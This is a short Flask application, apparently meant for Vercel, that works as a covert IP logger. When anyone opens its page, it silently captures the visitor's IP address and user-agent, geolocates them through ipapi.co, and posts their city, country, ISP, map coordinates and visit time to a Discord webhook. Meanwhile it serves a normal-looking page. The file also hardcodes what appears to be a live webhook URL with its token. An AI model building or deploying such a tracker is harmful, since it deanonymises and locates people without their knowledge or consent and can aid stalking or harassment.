from flask import Flask, render_template, request
import requests
from datetime import datetime
import os

app = Flask(__name__, template_folder='../templates')

# CONFIGURACIÓN
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

def send_to_discord(ip_data, user_agent):
    ip = ip_data.get('ip', 'N/A')
    
    embed = {
        "title": "⚡ Sistema Vercel: IP Detectada",
        "description": "Se ha registrado un acceso mediante el túnel seguro.",
        "color": 0x00D2FF,
        "fields": [
            {"name": "🌐 IP Pública", "value": f"**`{ip}`**", "inline": True},
            {"name": "📍 Ubicación", "value": f"{ip_data.get('city', 'Desconocida')}, {ip_data.get('country_name', 'N/A')}", "inline": True},
            {"name": "🏢 Proveedor (ISP)", "value": f"{ip_data.get('org', 'Desconocido')}", "inline": False},
            {"name": "🌍 Región / Mapa", "value": f"{ip_data.get('region', 'N/A')} ([Abrir Mapa](https://www.google.com/maps/search/?api=1&query={ip_data.get('latitude')},{ip_data.get('longitude')}))", "inline": False},
            {"name": "🕒 Conexión", "value": f"{datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", "inline": True},
            {"name": "📱 User-Agent", "value": f"```\n{user_agent}\n```", "inline": False}
        ],
        "footer": {
            "text": "1* Logger • Vercel Premium Edition",
            "icon_url": AVATAR_URL
        },
        "thumbnail": {
            "url": AVATAR_URL
        }
    }
    
    payload = {
        "username": "1* Logger",
        "avatar_url": AVATAR_URL,
        "embeds": [embed]
    }
    
    requests.post(DISCORD_WEBHOOK_URL, json=payload)

@app.route('/')
def index():
    # Detectar IP real en Vercel
    ip = request.headers.get('x-forwarded-for', request.remote_addr)
    if ',' in ip: ip = ip.split(',')[0]
    
    user_agent = request.headers.get('user-agent')

    try:
        geo_res = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5).json()
    except:
        geo_res = {"ip": ip}

    send_to_discord(geo_res, user_agent)
    return render_template('index.html')

# Vercel espera una variable llamada 'app' en el archivo de la API
# No es necesario app.run() aquí
